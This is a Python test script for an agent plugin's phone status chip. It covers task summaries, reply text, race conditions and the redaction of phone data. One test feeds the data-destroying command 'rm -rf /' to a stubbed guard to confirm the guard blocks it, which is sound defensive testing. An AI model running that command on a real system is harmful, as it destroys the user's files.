#!/usr/bin/env python3
"""Status chip checks (no phone needed): what the plugin tells the app about a running turn (chat title, steps,
task list, other busy chats, how the turn ended) and the /stop endpoint behind the chip's Stop button.
    python3 tools/test_chip.py
"""
import asyncio
import importlib.util
import json
import os
import sqlite3
import sys
import tempfile
import threading
import time
import types
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
fails = 0


def check(name, cond, detail=""):
    global fails
    print(f"  [{'PASS' if cond else 'FAIL'}] {name}" + (f"  ({detail})" if detail and not cond else ""))
    fails += 0 if cond else 1


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


tmp = Path(tempfile.mkdtemp())
os.environ["HOME"] = str(tmp)
os.environ["HERMES_HOME"] = str(tmp)
db = sqlite3.connect(tmp / "state.db")
db.execute("CREATE TABLE sessions (id TEXT PRIMARY KEY, title TEXT)")
db.executemany("INSERT INTO sessions VALUES (?, ?)", [("s-a", "Fix the build"), ("s-b", "⎇ Plan the trip")])
db.commit()
db.close()

plugin = load("hermes_mobile_plugin_chip", ROOT / "hermes-plugin" / "hermes-mobile" / "__init__.py")
posts, sent = [], []
plugin._post = lambda e: posts.append(e) or True
plugin._send = lambda kind, title="Hermux", body="", session="", urgent=False, **kw: sent.append(dict(kind=kind, title=title, body=body, **kw))
plugin.STATUS_MIN_INTERVAL = 0.0
plugin.HEARTBEAT = 0.2


def last_status(wait=0.4):
    time.sleep(wait)
    st = [e for e in posts if e.get("kind") == "status"]
    return st[-1] if st else {}


print("todo summary")
res = json.dumps({"todos": [
    {"id": "1", "content": "Read the code", "status": "completed"},
    {"id": "2", "content": "Write the fix", "status": "in_progress"},
    {"id": "2a", "content": "a subtask", "status": "pending", "parent": "2"},
    {"id": "3", "content": "Test it", "status": "pending"},
    {"id": "4", "content": "Old idea", "status": "cancelled"},
]})
s = plugin._todo_summary(res)
check("subtasks left out, one letter per task", s["states"] == "dapx", s)
check("done / total (cancelled not counted)", (s["done"], s["total"]) == (1, 3), s)
check("current = the task in progress", s["current"] == "Write the fix", s)
check("not a task list → None", plugin._todo_summary("oops") is None and plugin._todo_summary({"x": 1}) is None)
check("all pending → current is the first", plugin._todo_summary({"todos": [{"content": "A", "status": "pending"}]})["current"] == "A")

print("a turn's progress")
plugin._on_stream_start(session_id="s-a", turn_id="s-a:1")
e = last_status()
check("chat title rides on the status", e.get("title") == "Fix the build", e)
check("no steps yet", e.get("steps") == 0 and e.get("todo") is None, e)
since = e.get("since")
tid_a1 = e.get("turn_id")
check("turn start time, turn_id and proc sent", isinstance(since, float) and abs(since - time.time()) < 5
      and isinstance(tid_a1, str) and tid_a1.startswith(plugin._PROC_ID + ":") and e.get("proc") == plugin._PROC_ID, e)
plugin._on_pre_tool_call(tool_name="terminal", args={"command": "make"}, session_id="s-a", turn_id="s-a:1")
plugin._on_post_tool_call(tool_name="terminal", session_id="s-a", turn_id="s-a:1")
plugin._on_pre_tool_call(tool_name="todo_list", args={}, session_id="s-a", turn_id="s-a:1")  # its registered name
plugin._on_post_tool_call(tool_name="todo_list", result=res, session_id="s-a", turn_id="s-a:1")
e = last_status()
check("each tool call is a step, kept across 'Thinking…'", e.get("steps") == 2 and e.get("body") == "Thinking…", e)
check("task list kept on the turn", (e.get("todo") or {}).get("states") == "dapx", e.get("todo"))
check("same turn start and turn_id across steps", e.get("since") == since and e.get("turn_id") == tid_a1, (e.get("since"), e.get("turn_id"), tid_a1))

print("an app open in the background")
pa = plugin._phone_app()
pa._state.update({"session": "s-a", "pkg": "com.example.notes", "label": "Notes"})
plugin._on_post_tool_call(tool_name="phone_app", session_id="s-a", turn_id="s-a:1")
e = last_status()
check("the chip says 'Using <app>' while thinking", e.get("short") == "Using Notes" and e.get("body") == "Thinking…", e)
check("an action's line names the app and the action",
      plugin._tool_label("phone_app", {"action": "key", "key": "back"}) == "Notes: pressing back"
      and plugin._tool_short("phone_app", {"action": "key"}) == "Using Notes")
pa._state.clear()
plugin._on_post_tool_call(tool_name="phone_app", session_id="s-a", turn_id="s-a:1")
check("back to the normal chip once the app is closed", last_status().get("short") != "Using Notes")

ended = []
pa.end_session = lambda sid: ended.append(sid)
pa._state.update({"session": "s-x", "pkg": "com.example.notes", "label": "Notes"})
plugin._on_session_end(session_id="s-x", turn_id=None, interrupted=True)
for t in list(plugin._bgapp_enders):
    t.join(5)
check("a turn's end (even interrupted) ends its background app", ended == ["s-x"], ended)
del pa.end_session
pa._state.clear()

print("tools behind Hermes's Tool Search bridge")
bridged = {"calls": [{"name": "web_search", "arguments": {"query": "trains"}}]}
check("tool_call shows the tool underneath", plugin._tool_label("tool_call", bridged) == "Searching the web: trains"
      and plugin._tool_short("tool_call", bridged) == "Web", plugin._tool_label("tool_call", bridged))
check("a batch says how many", plugin._tool_label("tool_call", {"calls": [{"name": "a"}, {"name": "b"}]}) == "Using 2 tools")
check("tool lookups have a plain label", plugin._tool_label("tool_describe", {"names": ["x"]}) == "Looking up tools")
check("todo_list is 'Updating tasks'", plugin._tool_label("todo_list", {"todos": []}) == "Updating tasks")

print("two chats at once")
plugin._on_stream_start(session_id="s-b", turn_id="s-b:1")
plugin._on_pre_tool_call(tool_name="web_search", args={"query": "trains"}, session_id="s-b", turn_id="s-b:1")
e = last_status()
check("the chip stays on the chat that started first", e.get("session") == "s-a", e.get("session"))
others = e.get("others") or []
tid_b1 = others[0].get("turn_id") if others else ""
check("the other chat is listed with its title, step, since and distinct turn_id",
      len(others) == 1 and others[0].get("session") == "s-b" and others[0].get("title") == "Plan the trip"
      and others[0].get("text") == "Searching the web: trains"
      and isinstance(others[0].get("since"), float) and others[0]["since"] > 0
      and isinstance(tid_b1, str) and tid_b1.startswith(plugin._PROC_ID + ":") and tid_b1 != tid_a1
      and e.get("more") == 1, others)
check("body has no '(+1 more)' any more", "more)" not in e.get("body", ""), e.get("body"))

print("the turn ends")
plugin._last_text["s-a"] = "All fixed: the build passes."
plugin._on_session_end(session_id="s-a", turn_id="s-a:1", completed=True)
flash = [x for x in sent if x["kind"] == "flash"][-1]
check("Done carries steps, duration, reply, turn_id and proc", flash.get("steps") == 2 and flash.get("secs", -1) >= 0
      and flash.get("reply") == "All fixed: the build passes." and flash.get("done")
      and flash.get("turn_id") == tid_a1 and flash.get("proc") == plugin._PROC_ID, flash)
e = last_status()
check("then the chip follows the other chat with the same turn_id",
      e.get("session") == "s-b" and e.get("more") == 0 and e.get("turn_id") == tid_b1, e)
plugin._on_session_end(session_id="s-b", turn_id=None, interrupted=True)
plugin._on_stream_start(session_id="s-a", turn_id="s-a:2")
e = last_status()
tid_a2 = e.get("turn_id")
check("a new turn starts from zero with a fresh turn_id",
      e.get("steps") == 0 and e.get("todo") is None and e.get("since") != since
      and isinstance(tid_a2, str) and tid_a2 != tid_a1, e)
# Back-to-back turn on a chat in others (even without session_end, a different hook turn_id mints a fresh turn_id).
plugin._on_stream_start(session_id="s-b", turn_id="s-b:2")
e_o1 = last_status()
tid_b2 = (e_o1.get("others") or [{}])[0].get("turn_id", "")
plugin._on_stream_start(session_id="s-b", turn_id="s-b:3")
e_o2 = last_status()
tid_b3 = (e_o2.get("others") or [{}])[0].get("turn_id", "")
check("back-to-back turns in others get distinct turn_ids", tid_b2 and tid_b3 and tid_b2 != tid_b3, (tid_b2, tid_b3))
plugin._on_session_end(session_id="s-b", turn_id=None, interrupted=True)
plugin._on_session_end(session_id="s-a", turn_id=None, interrupted=True)
idle_e = last_status()
check("all over → Ready with proc", idle_e.get("working") is False and idle_e.get("proc") == plugin._PROC_ID, idle_e)

print("untitled chat is looked up again")
plugin._titles.clear()
check("new chat: empty title", plugin._title_for("s-new") == "")
db = sqlite3.connect(tmp / "state.db")
db.execute("INSERT INTO sessions VALUES ('s-new', 'Named later')")
db.commit()
db.close()
check("…cached for a while", plugin._title_for("s-new") == "")
plugin._titles["s-new"] = ("", time.time() - 30)
check("…then read again", plugin._title_for("s-new") == "Named later")

print("per-chat turn records stay bounded and keep running turns")
plugin._on_pre_llm_call(session_id="keep-1", turn_id="t-keep", user_message="hello")
plugin._set_status("keep-1", "Thinking…", "Thinking")
for i in range(300):
    plugin._on_pre_llm_call(session_id=f"flood-{i}", turn_id=f"t-{i}", user_message="hi")
check("a turn in progress keeps its start time while many other chats start", "keep-1" in plugin._turn_started,
      len(plugin._turn_started))
check("turn start records are bounded", len(plugin._turn_started) <= 300, len(plugin._turn_started))
for i in range(2000):
    plugin._on_subagent_start(child_session_id=f"child-{i}", parent_session_id=None)
    plugin._on_session_end(session_id=f"ended-{i}", turn_id=None)
check("sub-agent ids are bounded", len(plugin._subagents) <= 1024, len(plugin._subagents))
check("last-end records are bounded", len(plugin._last_end) <= 256, len(plugin._last_end))
check("the most recent sub-agent is still known", "child-1999" in plugin._subagents)
plugin._on_session_end(session_id="keep-1", turn_id=None)
check("ending a turn forgets its start", "keep-1" not in plugin._turn_started)

print("a background label never replaces a live turn, even when the turn starts between check and act")
plugin._clear_status("race-1")
real_lock = plugin._lock


class HookLock:
    """Runs a real turn's status change right after the first release of the lock (the gap the old check had)."""
    def __init__(self):
        self.armed = True

    def __enter__(self):
        real_lock.acquire()

    def __exit__(self, *a):
        real_lock.release()
        if self.armed:
            self.armed = False
            plugin._lock = real_lock
            plugin._set_status("race-1", "Using terminal", "Terminal", tool=True)


plugin._lock = HookLock()
plugin._bg_status("race-1", "t-x")
plugin._lock = real_lock
cur = plugin._active.get("race-1") or {}
check("a review label does not replace the live turn's status", not cur.get("review") and cur.get("short") == "Terminal", cur)
plugin._lock = HookLock()
plugin._bg_clear("race-1")
plugin._lock = real_lock
check("a review clear does not drop a live turn", "race-1" in plugin._active)
plugin._clear_status("race-1")


print("reply text via post_llm_call (Codex / non-streaming) and plain-words exit reasons")
sent.clear()
# Codex Responses passes final_text="" to on_stream_end, then passes assistant_response to post_llm_call right before on_session_end.
plugin._on_pre_llm_call(session_id="s-a", turn_id="s-a:codex1", user_message="What is the capital of France?")
plugin._on_stream_start(session_id="s-a", turn_id="s-a:codex1")
plugin._on_stream_end(final_text="", session_id="s-a", turn_id="s-a:codex1", finished=True)
plugin._on_post_llm_call(session_id="s-a", turn_id="s-a:codex1", assistant_response="The capital of France is Paris.")
plugin._on_session_end(session_id="s-a", turn_id="s-a:codex1", completed=True, platform="mobile",
                       turn_exit_reason="text_response(finish_reason=stop)")
rep = [x for x in sent if x["kind"] == "reply"][-1]
fl = [x for x in sent if x["kind"] == "flash"][-1]
check("Codex reply event carries reply text, speak_text and platform",
      rep.get("body") == "The capital of France is Paris."
      and rep.get("speak_text") == "The capital of France is Paris."
      and rep.get("platform") == "mobile", rep)
check("Codex flash (Done chip + island) carries reply text",
      fl.get("reply") == "The capital of France is Paris."
      and "Paris" in fl.get("body", ""), fl)

# Non-streaming provider: no on_stream_end at all, content-block list in post_llm_call.
sent.clear()
plugin._on_pre_llm_call(session_id="s-a", turn_id="s-a:ns1", user_message="hi")
plugin._on_post_llm_call(session_id="s-a", turn_id="s-a:ns1",
                         assistant_response=[{"type": "text", "text": "Tea is ready."}])
plugin._on_session_end(session_id="s-a", turn_id="s-a:ns1", completed=True, platform="mobile")
rep_ns = [x for x in sent if x["kind"] == "reply"][-1]
fl_ns = [x for x in sent if x["kind"] == "flash"][-1]
check("non-streaming list-of-blocks reply reaches reply, speak_text and flash",
      rep_ns.get("body") == "Tea is ready." and rep_ns.get("speak_text") == "Tea is ready."
      and fl_ns.get("reply") == "Tea is ready.", (rep_ns, fl_ns))

# Stale reply text is cleared when a new turn starts (so an empty cron/failed turn never reuses an earlier turn's text).
sent.clear()
plugin._last_text["s-cron"] = "Old reply from an earlier turn"
plugin._on_pre_llm_call(session_id="s-cron", turn_id="s-cron:1", user_message="run job")
plugin._on_post_llm_call(session_id="s-cron", turn_id="s-cron:1", assistant_response="Cron ping ok.")
plugin._on_session_end(session_id="s-cron", turn_id="s-cron:1", completed=True, platform="cron",
                       turn_exit_reason="text_response(finish_reason=stop)")
cr = [x for x in sent if x["kind"] == "cron"][-1]
check("cron job shows its reply text from post_llm_call", cr.get("body") == "Cron ping ok.", cr)

# Empty cron turn never shows raw text_response(finish_reason=stop); gets plain words.
sent.clear()
plugin._on_pre_llm_call(session_id="s-cron2", turn_id="s-cron2:1", user_message="run quiet job")
plugin._on_session_end(session_id="s-cron2", turn_id="s-cron2:1", completed=True, platform="cron",
                       turn_exit_reason="text_response(finish_reason=stop)")
cr_empty = [x for x in sent if x["kind"] == "cron"][-1]
check("empty cron turn gets plain words, never text_response(finish_reason=stop)",
      cr_empty.get("body") == "Finished" and "finish_reason" not in cr_empty.get("body", ""), cr_empty)

# Failed cron and failed chat turns never leak raw internal turn_exit_reason strings.
sent.clear()
plugin._on_pre_llm_call(session_id="s-fail", turn_id="s-fail:1", user_message="x")
plugin._on_session_end(session_id="s-fail", turn_id="s-fail:1", failed=True, platform="mobile",
                       turn_exit_reason="max_iterations_reached(20/20)")
er1 = [x for x in sent if x["kind"] == "error"][-1]
plugin._on_pre_llm_call(session_id="s-fail", turn_id="s-fail:2", user_message="x")
plugin._on_session_end(session_id="s-fail", turn_id="s-fail:2", failed=True, platform="mobile",
                       turn_exit_reason="local_processing_error(ValueError: internal traceback)")
er2 = [x for x in sent if x["kind"] == "error"][-1]
plugin._on_pre_llm_call(session_id="s-fail", turn_id="s-fail:3", user_message="x")
plugin._on_session_end(session_id="s-fail", turn_id="s-fail:3", failed=True, platform="mobile",
                       turn_exit_reason="unknown_repr(foo=bar)")
er3 = [x for x in sent if x["kind"] == "error"][-1]
check("failed turns map internal exit reasons to plain words (never raw reprs)",
      er1.get("body") == "Reached the step limit"
      and er2.get("body") == "Something went wrong while running the turn"
      and er3.get("body") == "The turn failed"
      and "ValueError" not in er2.get("body", "") and "unknown_repr" not in er3.get("body", ""),
      (er1, er2, er3))

# Tool Search bridge wrapping todo_list still updates the working status chip's task list.
plugin._on_stream_start(session_id="s-todo", turn_id="s-todo:1")
bridged_todo = {"calls": [{"name": "todo_list", "arguments": {"todos": [{"id": "1", "content": "Step 1", "status": "in_progress"}]}}]}
plugin._on_pre_tool_call(tool_name="tool_call", args=bridged_todo, session_id="s-todo", turn_id="s-todo:1")
plugin._on_post_tool_call(tool_name="tool_call", args=bridged_todo, result=res, session_id="s-todo", turn_id="s-todo:1")
st_todo = last_status()
check("todo_list through tool_call updates the chip's task list",
      (st_todo.get("todo") or {}).get("states") == "dapx", st_todo.get("todo"))
plugin._on_session_end(session_id="s-todo", turn_id=None, interrupted=True)

print("reply text hygiene: stale commentary, background work, thinking blocks, cap, early pop")
# Pre-tool commentary must be cleared when a tool step starts and never leak as a failed turn's error body.
sent.clear()
plugin._on_pre_llm_call(session_id="s-stale", turn_id="s-stale:1", user_message="run it")
plugin._on_stream_end(final_text="Let me check that file first.", session_id="s-stale", turn_id="s-stale:1", finished=False)
plugin._on_pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s-stale", turn_id="s-stale:1")
check("pre_tool_call clears pre-tool commentary from _last_text", "s-stale" not in plugin._last_text, plugin._last_text.get("s-stale"))
plugin._on_post_llm_call(session_id="s-stale", turn_id="s-stale:1", assistant_response="Earlier step commentary.")
plugin._on_session_end(session_id="s-stale", turn_id="s-stale:1", failed=True, platform="mobile",
                       turn_exit_reason="pending_tool_result")
er_stale = [x for x in sent if x["kind"] == "error"][-1]
check("failed turn prefers plain words over stored text",
      er_stale.get("body") == "Stopped before finishing a tool step", er_stale)

# _is_review checks _write_origin() even when turn_id is missing, and pre_llm_call skips review / /btw without wiping _last_text.
orig_wo = plugin._write_origin
try:
    plugin._write_origin = lambda: "side_question"
    check("_is_review detects side_question even when turn_id is None",
          plugin._is_review(None, "s-main") is True)
    plugin._last_text["s-main"] = "Main turn reply"
    plugin._on_pre_llm_call(session_id="s-main", turn_id=None, user_message="quick side question")
    check("pre_llm_call for /btw (even without turn_id) does not wipe main turn _last_text",
          plugin._last_text.get("s-main") == "Main turn reply", plugin._last_text.get("s-main"))
    plugin._write_origin = lambda: "background_review"
    check("_is_review detects background_review even when turn_id is None",
          plugin._is_review(None, "s-main") is True)
    plugin._on_pre_llm_call(session_id="s-main", turn_id="rev-turn", user_message="something else")
    check("pre_llm_call for background_review does not wipe main turn _last_text",
          plugin._last_text.get("s-main") == "Main turn reply", plugin._last_text.get("s-main"))
finally:
    plugin._write_origin = orig_wo
plugin._clear_status("s-main")

# _on_session_end with turn_id=None still pops _last_text so nothing leaks.
plugin._on_session_end(session_id="s-main", turn_id=None, interrupted=True)
check("on_session_end with turn_id=None pops _last_text", "s-main" not in plugin._last_text)

# _reply_text skips thinking/reasoning blocks and caps at MAX_REPLY_TEXT.
mixed_blocks = [
    {"type": "thinking", "text": "secret chain of thought"},
    {"type": "reasoning", "text": "private reasoning"},
    {"type": "text", "text": "Hello "},
    {"type": "output_text", "text": "world"},
    {"text": "!"},
]
check("_reply_text keeps only text/output_text/untyped blocks, never thinking or reasoning",
      plugin._reply_text(mixed_blocks) == "Hello world!", plugin._reply_text(mixed_blocks))
huge = "a" * (plugin.MAX_REPLY_TEXT + 5000)
check("_reply_text caps stored reply text at MAX_REPLY_TEXT",
      len(plugin._reply_text(huge)) == plugin.MAX_REPLY_TEXT, len(plugin._reply_text(huge)))

print("async on_stream_end race and late parallel tool workers")
sent.clear()
# 1. Step-1 commentary arriving asynchronously via on_stream_end(finished=False) after pre_tool_call is ignored.
plugin._on_pre_llm_call(session_id="s-race", turn_id="r:1", user_message="run tool")
plugin._on_post_llm_call(session_id="s-race", turn_id="r:1", assistant_response="Step 1 commentary")
plugin._on_pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s-race", turn_id="r:1")
plugin._on_stream_end(final_text="Step 1 commentary (late)", session_id="s-race", turn_id="r:1", finished=False)
plugin._on_session_end(session_id="s-race", turn_id="r:1", completed=True, platform="mobile")
rep_race1 = [x for x in sent if x["kind"] == "reply"][-1]
check("late on_stream_end(finished=False) never restores cleared pre-tool commentary",
      rep_race1.get("body") == "Done", rep_race1)

# 2. post_llm_call wins over on_stream_end(finished=True) in either order; stream_end only fills in when empty.
sent.clear()
plugin._on_pre_llm_call(session_id="s-race", turn_id="r:2", user_message="answer")
plugin._on_post_llm_call(session_id="s-race", turn_id="r:2", assistant_response="Authoritative final reply")
plugin._on_stream_end(final_text="Stale streamed text", session_id="s-race", turn_id="r:2", finished=True)
plugin._on_session_end(session_id="s-race", turn_id="r:2", completed=True, platform="mobile")
rep_race2 = [x for x in sent if x["kind"] == "reply"][-1]
check("post_llm_call wins when on_stream_end(finished=True) arrives after it",
      rep_race2.get("body") == "Authoritative final reply", rep_race2)

sent.clear()
plugin._on_pre_llm_call(session_id="s-race", turn_id="r:3", user_message="answer")
plugin._on_stream_end(final_text="Earlier streamed text", session_id="s-race", turn_id="r:3", finished=True)
plugin._on_post_llm_call(session_id="s-race", turn_id="r:3", assistant_response="Final post_llm_call text")
plugin._on_session_end(session_id="s-race", turn_id="r:3", completed=True, platform="mobile")
rep_race3 = [x for x in sent if x["kind"] == "reply"][-1]
check("post_llm_call overwrites earlier on_stream_end(finished=True)",
      rep_race3.get("body") == "Final post_llm_call text", rep_race3)

sent.clear()
plugin._on_pre_llm_call(session_id="s-race", turn_id="r:4", user_message="stream only")
plugin._on_stream_end(final_text="Stream fallback reply", session_id="s-race", turn_id="r:4", finished=True)
plugin._on_session_end(session_id="s-race", turn_id="r:4", completed=True, platform="mobile")
rep_race4 = [x for x in sent if x["kind"] == "reply"][-1]
check("on_stream_end(finished=True) fills in when post_llm_call gave no text",
      rep_race4.get("body") == "Stream fallback reply", rep_race4)

# 3. pre_tool_call clears commentary even when auto_mode blocks early.
orig_auto = plugin._auto_mode
try:
    class _BlockAuto:
        def check(self, *a, **kw):
            return {"action": "block", "message": "blocked"}
    plugin._auto_mode = lambda: _BlockAuto()
    sent.clear()
    plugin._on_pre_llm_call(session_id="s-blk", turn_id="blk:1", user_message="danger")
    plugin._on_post_llm_call(session_id="s-blk", turn_id="blk:1", assistant_response="Running rm now...")
    v = plugin._on_pre_tool_call(tool_name="terminal", args={"command": "rm -rf /"}, session_id="s-blk", turn_id="blk:1")
    check("auto_mode blocked the tool call", isinstance(v, dict) and v.get("action") == "block", v)
    plugin._on_session_end(session_id="s-blk", turn_id="blk:1", completed=True, platform="mobile")
    rep_blk = [x for x in sent if x["kind"] == "reply"][-1]
    check("pre_tool_call cleared commentary even before auto_mode early return",
          rep_blk.get("body") == "Done", rep_blk)
finally:
    plugin._auto_mode = orig_auto

# 4. A late tool worker from an already-ended turn (r:4) must not wipe a newer turn (r:5)'s reply.
sent.clear()
plugin._on_pre_llm_call(session_id="s-race", turn_id="r:5", user_message="next turn")
plugin._on_post_llm_call(session_id="s-race", turn_id="r:5", assistant_response="Turn 5 final answer")
plugin._on_pre_tool_call(tool_name="terminal", args={"command": "echo late"}, session_id="s-race", turn_id="r:4")
plugin._on_session_end(session_id="s-race", turn_id="r:5", completed=True, platform="mobile")
rep_race5 = [x for x in sent if x["kind"] == "reply"][-1]
check("late tool worker from timed-out turn r:4 does not wipe turn r:5 reply",
      rep_race5.get("body") == "Turn 5 final answer", rep_race5)

# 5. A turn with no turn_id (None) cannot clear or keep another keyed turn's reply text,
#    and an empty untagged turn cannot reuse an earlier untagged turn's reply text.
sent.clear()
plugin._on_pre_llm_call(session_id="s-noid", turn_id="k:1", user_message="first")
plugin._on_post_llm_call(session_id="s-noid", turn_id="k:1", assistant_response="Keyed turn 1 reply")
plugin._on_pre_llm_call(session_id="s-noid", turn_id=None, user_message="untagged start")
taken_none = plugin._take_reply("s-noid", None)
plugin._on_session_end(session_id="s-noid", turn_id="k:1", completed=True, platform="mobile")
rep_k1 = [x for x in sent if x["kind"] == "reply"][-1]
check("a turn with turn_id=None cannot clear or steal a keyed turn's reply",
      taken_none == "" and rep_k1.get("body") == "Keyed turn 1 reply", (taken_none, rep_k1))

plugin._on_pre_llm_call(session_id="s-noid2", turn_id=None, user_message="first untagged")
plugin._on_post_llm_call(session_id="s-noid2", turn_id=None, assistant_response="Old untagged reply")
plugin._on_pre_llm_call(session_id="s-noid2", turn_id=None, user_message="second untagged")
check("a new untagged turn clears an earlier untagged turn's reply",
      plugin._take_reply("s-noid2", None) == "")

sent.clear()
plugin._on_pre_llm_call(session_id="s-noid3", turn_id="t:1", user_message="turn 1")
plugin._on_post_llm_call(session_id="s-noid3", turn_id="t:1", assistant_response="Turn 1 text")
plugin._on_pre_llm_call(session_id="s-noid3", turn_id="t:2", user_message="turn 2")
taken_t2 = plugin._take_reply("s-noid3", "t:2")
taken_t1 = plugin._take_reply("s-noid3", "t:1")
check("starting turn t:2 neither clears nor steals turn t:1's reply",
      taken_t2 == "" and taken_t1 == "Turn 1 text", (taken_t2, taken_t1))

print("phone-data redaction on plugin side (direct, compacted, branched, status/ask/learning/cron)")
import shutil, sqlite3
pt = plugin._phone_taint()
pd_mod = plugin._phone_data()
tmp_pd_dir = Path(tempfile.mkdtemp())
orig_pt_path = pt.PATH
orig_state_db = pd_mod._state_db
orig_report = plugin._report_taint
try:
    pt.PATH = tmp_pd_dir / "phone-read.json"
    pt._mem.clear()
    pt._cache = (None, {}, {})
    plugin._INHERIT_SEEN.clear()
    plugin._report_taint = lambda batch: None  # no HTTP in unit test
    db_path = tmp_pd_dir / "state.db"
    con = sqlite3.connect(db_path)
    con.execute("CREATE TABLE sessions (id TEXT PRIMARY KEY, parent_session_id TEXT, end_reason TEXT, model_config TEXT, started_at REAL)")
    now_t = time.time()
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-pd-1", None, "compression", "{}", now_t - 100))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-pd-compact", "s-pd-1", None, "{}", now_t - 10))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-pd-branch", None, None, json.dumps({"_branched_from": "s-pd-1"}), now_t + 10))
    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-pd-clean", None, None, "{}", now_t + 10))
    con.commit()
    con.close()
    pd_mod._state_db = lambda: db_path

    # Mark s-pd-1 as having read phone data.
    pt.mark(["s-pd-1"])

    # Direct phone-data chat: reply, flash, speak_text, error, cron (finished + failed).
    sent.clear()
    plugin._on_pre_llm_call(session_id="s-pd-1", turn_id="pd:1", user_message="read sms")
    plugin._on_post_llm_call(session_id="s-pd-1", turn_id="pd:1", assistant_response="Your bank OTP is 998877")
    plugin._on_session_end(session_id="s-pd-1", turn_id="pd:1", completed=True, platform="mobile")
    r_pd = [x for x in sent if x["kind"] == "reply"][-1]
    f_pd = [x for x in sent if x["kind"] == "flash"][-1]
    check("tainted chat reply is redacted to Reply ready with empty speak_text and phone_data=True",
          r_pd.get("body") == "Reply ready" and r_pd.get("speak_text") == "" and r_pd.get("phone_data") is True
          and "998877" not in json.dumps(sent), (r_pd, f_pd))
    check("tainted chat flash is redacted to Reply ready with phone_data=True",
          f_pd.get("reply") == "Reply ready" and f_pd.get("phone_data") is True, f_pd)

    # Compacted session s-pd-compact answering WITHOUT calling any tool is redacted synchronously.
    sent.clear()
    plugin._on_pre_llm_call(session_id="s-pd-compact", turn_id="pdc:1", user_message="summarize")
    plugin._on_post_llm_call(session_id="s-pd-compact", turn_id="pdc:1", assistant_response="Secret compacted SMS 445566")
    plugin._on_session_end(session_id="s-pd-compact", turn_id="pdc:1", completed=True, platform="mobile")
    r_cmp = [x for x in sent if x["kind"] == "reply"][-1]
    check("compacted phone-data chat S2 is redacted synchronously without any tool call",
          r_cmp.get("body") == "Reply ready" and r_cmp.get("speak_text") == "" and r_cmp.get("phone_data") is True
          and "445566" not in json.dumps(sent), r_cmp)

    # Branched session s-pd-branch answering WITHOUT calling any tool is redacted synchronously.
    sent.clear()
    plugin._on_pre_llm_call(session_id="s-pd-branch", turn_id="pdb:1", user_message="repeat")
    plugin._on_post_llm_call(session_id="s-pd-branch", turn_id="pdb:1", assistant_response="Secret branched SMS 778899")
    plugin._on_session_end(session_id="s-pd-branch", turn_id="pdb:1", completed=True, platform="mobile")
    r_br = [x for x in sent if x["kind"] == "reply"][-1]
    check("branched phone-data chat S3 is redacted synchronously without any tool call",
          r_br.get("body") == "Reply ready" and r_br.get("speak_text") == "" and r_br.get("phone_data") is True
          and "778899" not in json.dumps(sent), r_br)

    # Failed turn and cron (finished + failed) on tainted chat.
    sent.clear()
    plugin._on_session_end(session_id="s-pd-1", turn_id="pd:2", failed=True, platform="mobile", turn_exit_reason="pending_tool_result")
    e_pd = [x for x in sent if x["kind"] == "error"][-1]
    check("tainted failed turn sends Turn failed and phone_data=True",
          e_pd.get("body") == "Turn failed" and e_pd.get("phone_data") is True, e_pd)

    sent.clear()
    plugin._on_post_llm_call(session_id="s-pd-1", turn_id="pd:3", assistant_response="Secret cron output")
    plugin._on_session_end(session_id="s-pd-1", turn_id="pd:3", completed=True, platform="cron")
    c_ok = [x for x in sent if x["kind"] == "cron"][-1]
    plugin._on_session_end(session_id="s-pd-1", turn_id="pd:4", failed=True, platform="cron")
    c_fail = [x for x in sent if x["kind"] == "cron"][-1]
    check("tainted cron sends Job finished / Job failed with failed flag and phone_data=True",
          c_ok.get("body") == "Job finished" and c_ok.get("failed") is False and c_ok.get("phone_data") is True
          and c_fail.get("body") == "Job failed" and c_fail.get("failed") is True and c_fail.get("phone_data") is True,
          (c_ok, c_fail))

    # Tainted status (step, todo text, others), clarify (ask), memory and skill learning.
    sent.clear()
    plugin._on_stream_start(session_id="s-pd-1", turn_id="pd:5")
    plugin._on_pre_tool_call(tool_name="read_file", args={"path": "/secret/otp.txt"}, session_id="s-pd-1", turn_id="pd:5")
    plugin._on_post_tool_call(tool_name="todo_list", args={}, result=res, session_id="s-pd-1", turn_id="pd:5")
    st_pd = last_status()
    check("tainted status redacts body, short and todo current text while keeping progress counts",
          st_pd.get("body") == "Working" and st_pd.get("short") == "Working" and st_pd.get("phone_data") is True
          and (st_pd.get("todo") or {}).get("current") == "" and (st_pd.get("todo") or {}).get("total") == 3
          and "otp.txt" not in json.dumps(st_pd), st_pd)

    sent.clear()
    plugin._on_pre_tool_call(tool_name="clarify", args={"question": "Forward OTP 1234?", "choices": ["Yes 1234", "No"]},
                             session_id="s-pd-1", turn_id="pd:5")
    ask_pd = [x for x in sent if x["kind"] == "ask"][-1]
    check("tainted clarify sends generic ask without question or choice text",
          ask_pd.get("body") == "Hermes has a question, open Hermux to answer"
          and ask_pd.get("choices") == [] and ask_pd.get("single") is False and ask_pd.get("phone_data") is True
          and "1234" not in json.dumps(ask_pd), ask_pd)

    sent.clear()
    plugin._on_post_tool_call(tool_name="memory", args={"action": "add", "target": "user", "content": "Secret PIN 9876"},
                              status="ok", session_id="s-pd-1", turn_id="pd:5")
    mem_pd = [x for x in sent if x["kind"] == "learning"][-1]
    plugin._on_skill_lifecycle(action="created", skill_name="secret-pin-skill", session_id="s-pd-1")
    sk_pd = [x for x in sent if x["kind"] == "learning"][-1]
    check("tainted memory and skill learning send Learned something new and phone_data=True",
          mem_pd.get("body") == "Learned something new" and mem_pd.get("phone_data") is True and "9876" not in json.dumps(mem_pd)
          and sk_pd.get("body") == "Learned something new" and sk_pd.get("phone_data") is True and "secret-pin" not in json.dumps(sk_pd),
          (mem_pd, sk_pd))
    plugin._on_session_end(session_id="s-pd-1", turn_id=None, interrupted=True)

    # Untainted chat s-pd-clean still receives normal reply text.
    sent.clear()
    plugin._on_pre_llm_call(session_id="s-pd-clean", turn_id="cln:1", user_message="hi")
    plugin._on_post_llm_call(session_id="s-pd-clean", turn_id="cln:1", assistant_response="Normal clean reply")
